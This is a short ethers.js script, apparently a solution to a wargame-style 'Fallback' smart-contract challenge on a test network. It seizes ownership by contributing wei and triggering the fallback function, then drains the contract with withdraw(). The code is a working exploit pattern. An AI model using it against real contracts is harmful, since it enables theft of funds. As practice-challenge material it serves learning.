const { ethers } = require("ethers");
const abi = require("../../artifacts/contracts/1-fallback/Fallback.sol/Fallback.json").abi;
require("dotenv").config();

const FALLBACK_ADDRESS = "0x79F6562E605cDC40974d6675aa44DE518fA95359";

fallbackAttack = async () => {
    const provider = new ethers.JsonRpcProvider(`https://polygon-mumbai.g.alchemy.com/v2/${process.env.ALCHEMY_KEY}`);
    const wallet = new ethers.Wallet(process.env.METAMASK_KEY, provider);
    const fallbackContract = new ethers.Contract(FALLBACK_ADDRESS, abi, wallet);
    let tx = await fallbackContract.contribute({ 
        value: ethers.parseUnits("1", "wei"),
        gasPrice: ethers.parseUnits("3", "gwei"),
        gasLimit: 2000000
     });
     await tx.wait();
     tx = await wallet.sendTransaction({
        to: FALLBACK_ADDRESS,
        value: ethers.parseUnits("1", "wei"),
        gasPrice: ethers.parseUnits("3", "gwei"),
        gasLimit: 2000000
     });
     await tx.wait();
     tx = await fallbackContract.withdraw();
     await tx.wait();
};

fallbackAttack();